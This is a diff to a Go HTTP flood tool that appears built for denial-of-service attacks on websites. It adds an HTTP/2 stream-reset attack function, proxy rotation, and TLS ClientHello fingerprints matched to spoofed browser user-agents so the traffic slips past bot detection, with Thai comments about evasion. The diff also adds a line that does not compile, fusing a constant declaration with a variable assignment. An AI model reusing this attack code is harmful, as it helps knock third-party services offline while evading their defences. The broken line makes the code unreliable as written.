@@ -50,7 +50,6 @@ var (
 var (
 	userAgents = []string{
 		// ======================== CHROME 2025-2026 ========================
-		// ======================== CHROME 2025-2026 ========================
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
@@ -853,72 +852,51 @@ func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
 	return result
 }
 
-func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client *http.Client) {
+func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client *http.Client, ua string) {
 	select {
 	case <-parentCtx.Done():
 		return
 	default:
 	}
-
-	// แก้ไข: ดึง Method จาก config แทนการล็อคเป็น POST
 	method := getRandomElement(config.methods)
 	var body io.Reader
 	var contentType string
-
-	// ส่ง Payload เฉพาะเมื่อไม่ใช่ GET
 	if method != "GET" && method != "HEAD" {
 		format := getRandomElement(payloadFormats)
 		body, contentType = generateRandomPayload(format)
 	}
-
 	req, err := http.NewRequestWithContext(parentCtx, method, config.targetURL, body)
 	if err != nil {
 		return
 	}
-	req.Header.Set("User-Agent", getRandomElement(userAgents))
+	req.Header.Set("User-Agent", ua) // ใช้ UA ที่ส่งมา
 	req.Header.Set("Cache-Control", "no-store")
 	if contentType != "" {
 		req.Header.Set("Content-Type", contentType)
 	}
-
 	atomic.AddUint64(&requestsSent, 1)
 	atomic.AddUint64(&madeYouResetAttempts, 1)
 	resp, err := client.Do(req)
-
 	if err != nil {
 		var streamErr http2.StreamError
 		if errors.As(err, &streamErr) {
 			atomic.AddUint64(&madeYouResetSuccess, 1)
-			logMessage(statusOkColor.Sprintf("[H2-RESET] Success (Server Reset Stream)"))
-		} else if err != context.Canceled {
-			atomic.AddUint64(&madeYouResetErrors, 1)
-			logMessage(statusErrColor.Sprintf("[H2-RESET] Network Error: %v", err))
+			logMessage(statusOkColor.Sprintf("[H2-RESET] Success"))
 		}
 	} else if resp != nil {
 		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		atomic.AddUint64(&responsesRec, 1)
-		statusCountsMux.Lock()
-		if _, ok := statusCounts["2"]; !ok {
-			statusCounts["2"] = make(map[int]uint64)
-		}
-		statusCounts["2"][resp.StatusCode]++
-		statusCountsMux.Unlock()
 	}
 }
 
-func buildUTLSConn(insecureTLS bool, sni string, proxyList []string) func(ctx context.Context, network, addr string) (net.Conn, error) {
+func buildUTLSConn(insecureTLS bool, sni string, proxyList []string, helloID utls.ClientHelloID) func(ctx context.Context, network, addr string) (net.Conn, error) {
 	return func(ctx context.Context, network, addr string) (net.Conn, error) {
 		var conn net.Conn
 		var err error
-
 		if len(proxyList) > 0 {
-			// เชื่อมต่อผ่าน Proxy Tunnel
 			pAddr := proxyList[mathrand.Intn(len(proxyList))]
-			pURL, err := url.Parse(pAddr)
-			if err != nil {
-				return nil, err
-			}
+			pURL, _ := url.Parse(pAddr)
 			dialer := &net.Dialer{Timeout: 15 * time.Second}
 			conn, err = dialer.DialContext(ctx, "tcp", pURL.Host)
 			if err != nil {
@@ -934,32 +912,17 @@ func buildUTLSConn(insecureTLS bool, sni string, proxyList []string) func(ctx co
 			resp.Body.Close()
 			if resp.StatusCode != 200 {
 				conn.Close()
-				return nil, fmt.Errorf("proxy connection failed: %d", resp.StatusCode)
+				return nil, fmt.Errorf("proxy err: %d", resp.StatusCode)
 			}
 		} else {
-			// เชื่อมต่อตรง
 			dialer := &net.Dialer{Timeout: 30 * time.Second, KeepAlive: 30 * time.Second}
 			conn, err = dialer.DialContext(ctx, network, addr)
 			if err != nil {
 				return nil, err
 			}
 		}
-
 		uTlsConfig := &utls.Config{ServerName: sni, InsecureSkipVerify: insecureTLS}
-		var clientHello utls.ClientHelloID
-		// สุ่ม Browser Profile เพื่อความเนียนในการหลบเลี่ยง
-		switch mathrand.Intn(4) {
-		case 0:
-			clientHello = utls.HelloChrome_Auto
-		case 1:
-			clientHello = utls.HelloFirefox_Auto
-		case 2:
-			clientHello = utls.HelloSafari_16_0
-		default:
-			clientHello = utls.HelloRandomized
-		}
-
-		uconn := utls.UClient(conn, uTlsConfig, clientHello)
+		uconn := utls.UClient(conn, uTlsConfig, helloID) // ใช้ ID ที่ส่งมา
 		if err := uconn.HandshakeContext(ctx); err != nil {
 			conn.Close()
 			return nil, err
@@ -968,9 +931,10 @@ func buildUTLSConn(insecureTLS bool, sni string, proxyList []string) func(ctx co
 	}
 }
 
-func buildHTTPClient(config *workerConfig, httpVersion string) *http.Client {
+func buildHTTPClient(config *workerConfig, httpVersion string, ua string) *http.Client {
 	sni := randomSNI(config.targetURL)
-	dialer := buildUTLSConn(config.insecureTLS, sni, config.proxyList)
+	helloID := getMatchingTLSProfile(ua) // หาคู่ TLS ที่ตรงกับ UA
+	dialer := buildUTLSConn(config.insecureTLS, sni, config.proxyList, helloID)
 
 	if httpVersion == "2" {
 		h2Transport := &http2.Transport{
@@ -980,17 +944,11 @@ func buildHTTPClient(config *workerConfig, httpVersion string) *http.Client {
 		}
 		return &http.Client{Transport: h2Transport, Timeout: 30 * time.Second}
 	}
-
 	transport := &http.Transport{
-		Proxy: http.ProxyFromEnvironment,
 		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
 			return dialer(ctx, network, addr)
 		},
-		MaxIdleConns:          100,
-		IdleConnTimeout:       90 * time.Second,
-		TLSHandshakeTimeout:   10 * time.Second,
-		ExpectContinueTimeout: 1 * time.Second,
-		TLSNextProto:          make(map[string]func(string, *tls.Conn) http.RoundTripper),
+		TLSNextProto: make(map[string]func(string, *tls.Conn) http.RoundTripper),
 	}
 	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
 }
@@ -1043,12 +1001,12 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 
 	var client *http.Client
 	var burstsSinceLastCycle int
-	const clientCycleThreshold = 50
+	const clientCycleThreshold = 50 selectedUA := getRandomElement(userAgents)
 
 	if httpVersion == "3" {
-		client = buildHTTP3Client(config)
+    client = buildHTTP3Client(config)
 	} else {
-		client = buildHTTPClient(config, httpVersion)
+    client = buildHTTPClient(config, httpVersion, selectedUA) // ส่ง UA เข้าไป
 	}
 
 	if httpVersion == "2" {
@@ -1061,7 +1019,7 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 					return
 				case <-ticker.C:
 					for i := 0; i < 3+mathrand.Intn(5); i++ {
-						madeYouResetAttack(ctx, config, client)
+						madeYouResetAttack(ctx, config, client, selectedUA)
 					}
 				}
 			}
@@ -1113,7 +1071,7 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 				}
 
 				headerSet := map[string]string{
-					randomHeaderName("User-Agent"):      getRandomElement(userAgents),
+					randomHeaderName("User-Agent"): selectedUA,
 					randomHeaderName("Accept-Language"): getRandomElement(languages),
 					randomHeaderName("Referer"):         getRandomElement(referers),
 					randomHeaderName("Accept"):          getRandomElement(accepts),
@@ -1536,4 +1494,17 @@ func main() {
 	go monitor(ctx, duration, config)
 
 	wg.Wait()
+}
+func getMatchingTLSProfile(ua string) utls.ClientHelloID {
+	uaLower := strings.ToLower(ua)
+	if strings.Contains(uaLower, "chrome") || strings.Contains(uaLower, "criose") {
+		return utls.HelloChrome_Auto
+	}
+	if strings.Contains(uaLower, "firefox") || strings.Contains(uaLower, "fxios") {
+		return utls.HelloFirefox_Auto
+	}
+	if strings.Contains(uaLower, "safari") && !strings.Contains(uaLower, "chrome") {
+		return utls.HelloSafari_16_0
+	}
+	return utls.HelloRandomized
 }
